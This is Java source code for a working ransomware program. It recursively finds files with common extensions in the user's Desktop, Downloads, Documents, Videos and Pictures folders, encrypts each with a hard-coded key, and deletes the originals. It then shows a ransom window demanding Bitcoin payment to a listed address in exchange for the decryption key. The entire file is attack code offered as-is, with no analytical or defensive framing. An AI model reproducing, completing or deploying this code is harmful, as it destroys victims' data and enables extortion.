package com.company;
import org.apache.commons.io.FileUtils;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Locale;

public class Main {
    public enum OperatingSystem {
        WINDOWS,LINUX,MAC
    };

    public static String key="nZr4u7x!A%C*F-Ja";

    private static OperatingSystem systems=null;

    public static void main(String[] args) {
        FileHunter();
        WarningMsg();
    }
    public static void FileHunter() {
        try {
            switch (getOperatingSystem()) {
                case WINDOWS:
                    // important files of windows
                case LINUX:
                    System.out.println("This is linux");
                case MAC:
                    // important files of mac
            }
        }catch (Exception e) {
            System.out.println(e);
        }

        ArrayList<String> CriticalFilePath = new ArrayList<String>();
        CriticalFilePath.add(System.getProperty("user.home") + "/Desktop");
        CriticalFilePath.add(System.getProperty("user.home") + "/Downloads");
        CriticalFilePath.add(System.getProperty("user.home") + "/Documents");
        CriticalFilePath.add(System.getProperty("user.home") + "/Videos");
        CriticalFilePath.add(System.getProperty("user.home") + "/Pictures");

        for(String SpecificLocation : CriticalFilePath) {
            File MainRoot = new File(SpecificLocation);
            try{
                String[] FileExtesions = {"png","pdf","py","java","rar","txt","exe","mov","mkv","jpg","jpeg","zip","mp3","mp4","dat","iso","deb","tar.z","exel","doc","info"};
                Collection files = FileUtils.listFiles(MainRoot,FileExtesions,true);

                for(Object o : files){
                    File file = (File) o;
                    FileEncryptor(file.getAbsolutePath());
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }


    }   public static void FileHunter(String extention) {
        try {
            switch (getOperatingSystem()) {
                case WINDOWS:
                    System.out.println("This is windows");
                case LINUX:
                    System.out.println("This is linux");
                case MAC:
                    System.out.println("This is Mac");
            }
        }catch (Exception e) {
            System.out.println(e);
        }

        ArrayList<String> CriticalFilePath = new ArrayList<String>();
        CriticalFilePath.add(System.getProperty("user.home") + "/Desktop");
        CriticalFilePath.add(System.getProperty("user.home") + "/Downloads");
        CriticalFilePath.add(System.getProperty("user.home") + "/Documents");
        CriticalFilePath.add(System.getProperty("user.home") + "/Videos");
        CriticalFilePath.add(System.getProperty("user.home") + "/Pictures");

        for(String SpecificLocation : CriticalFilePath) {
            File MainRoot = new File(SpecificLocation);
            try{
                String[] FileExtesions = {extention};
                Collection files = FileUtils.listFiles(MainRoot,FileExtesions,true);

                for(Object o : files){
                    File file = (File) o;
                    FileDecryptor(file.getAbsolutePath());
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }


    }
    public static void FileEncryptor(String VictimFilePath) {
        File TargetVictimFileLocation = new File(VictimFilePath);
        File EncryptedTargetVictimFilePath = new File(VictimFilePath+".encrypted");

        try{
            CryptoUtils.encrypt(key,TargetVictimFileLocation,EncryptedTargetVictimFilePath);
            TargetVictimFileLocation.delete();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
    public static void WarningMsg() {
        JFrame frame = new JFrame("Attention !");
        JLabel label = new JLabel();

        label.setText("Attention! All files have been Encrypted Contact the Attacker and purchase the decryption key and fill the key to start decryption process");

        JPanel panel = new JPanel();
        panel.add(label);
        frame.add(panel);

        JPanel panel1 = new JPanel();
        JLabel label1 = new JLabel("Enter key for decryption : ");

        JTextField field = new JTextField(10);

        JButton submitbtn = new JButton("Start decryption");
        JButton resetbtn = new JButton("Reset");
        JLabel label2 = new JLabel("Pay 0.00015  Bitcoin in Id number - 3QD383DtXMvTADXWBgnCM7xG2TEj33x3Pu"+" [While paying fill your email in message to receive key]");
        label2.setSize(40,40);

        resetbtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                String ab = "";
                field.setText(ab);
            }
        });
        panel1.add(label1);
        panel1.add(label2);
        panel1.add(submitbtn);
        panel1.add(resetbtn);


        frame.getContentPane().add(BorderLayout.SOUTH,label1);
        frame.getContentPane().add(BorderLayout.LINE_START,label);
        frame.getContentPane().add(BorderLayout.AFTER_LAST_LINE,label2);
        frame.getContentPane().add(BorderLayout.NORTH,panel1);
        frame.setVisible(true);
        frame.setSize(980,240);

        panel1.add(field);

        submitbtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                String keyEnteredByVictim = field.getText();

                if(keyEnteredByVictim.equalsIgnoreCase(key)) {
                    JOptionPane.showMessageDialog(frame,"Fine You Entered a Right Key Wait For a While Files Are Restoring");
                    FileHunter("encrypted");
                }else {
                    JOptionPane.showMessageDialog(frame,"Attention! This key is not Right");
                }
            }
        });
    }
    public static void FileDecryptor(String EncryptedTargetVictimFilePath) {
        File TargetVictimFileLocation = new File(EncryptedTargetVictimFilePath);
        File DecryptedVictimFilePath = new File(EncryptedTargetVictimFilePath + "Decryted");

        try{
            CryptoUtils.decrypt(key,TargetVictimFileLocation,DecryptedVictimFilePath);
        }catch (Exception e) {
            e.printStackTrace();
        }

        TargetVictimFileLocation.delete();

    }

    public static OperatingSystem getOperatingSystem() {
        if (systems == null) {
            String opersys = System.getProperty("os.name").toLowerCase(Locale.ROOT);
            if(opersys.contains("win")) {
                systems = OperatingSystem.WINDOWS;
            }
            else if(opersys.contains("nix")||opersys.contains(("nux"))||opersys.contains("aix")) {
                systems = OperatingSystem.LINUX;
            }
            else if(opersys.contains("nac")) {
                systems = OperatingSystem.MAC;
            }
        }
        return systems;
    }
}
